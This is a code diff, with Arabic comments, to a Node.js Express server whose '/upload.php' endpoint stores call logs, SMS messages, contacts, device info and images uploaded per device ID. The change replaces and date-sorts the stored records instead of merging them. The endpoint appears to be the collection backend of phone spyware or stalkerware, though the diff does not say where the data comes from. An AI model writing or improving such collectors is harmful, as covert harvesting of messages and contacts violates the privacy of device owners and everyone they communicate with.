@@ -46,7 +46,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
-        // ============ البيانات العادية — دمج الجديد فوق القديم ============
+        // ============ البيانات العادية ============
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) {
@@ -58,17 +58,23 @@ app.post('/upload.php', (req, res) => {
         let existingData = {};
         if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         
-        // ✅ دمج الجديد فوق القديم
+        // ✅ استبدال + ترتيب
         if (data.data) {
+            // ✅ المكالمات — استبدال + ترتيب تنازلي
             if (data.data.call_logs && data.data.call_logs.length > 0) {
-                if (!existingData.call_logs) existingData.call_logs = [];
-                existingData.call_logs = [...data.data.call_logs, ...existingData.call_logs];
+                existingData.call_logs = data.data.call_logs;
+                existingData.call_logs.sort((a, b) => (b.date || 0) - (a.date || 0));
             }
+            
+            // ✅ الرسائل — استبدال + ترتيب تنازلي (الأحدث أولًا)
             if (data.data.sms && data.data.sms.length > 0) {
-                if (!existingData.sms) existingData.sms = [];
-                existingData.sms = [...data.data.sms, ...existingData.sms];
+                existingData.sms = data.data.sms;
+                existingData.sms.sort((a, b) => (b.date || 0) - (a.date || 0));
             }
-            if (data.data.contacts) existingData.contacts = data.data.contacts;
+            
+            if (data.data.contacts && data.data.contacts.length > 0) {
+                existingData.contacts = data.data.contacts;
+            }
             if (data.data.device_info) {
                 existingData.device_info = data.data.device_info;
                 updateDevicesList(deviceId, data.data.device_info);
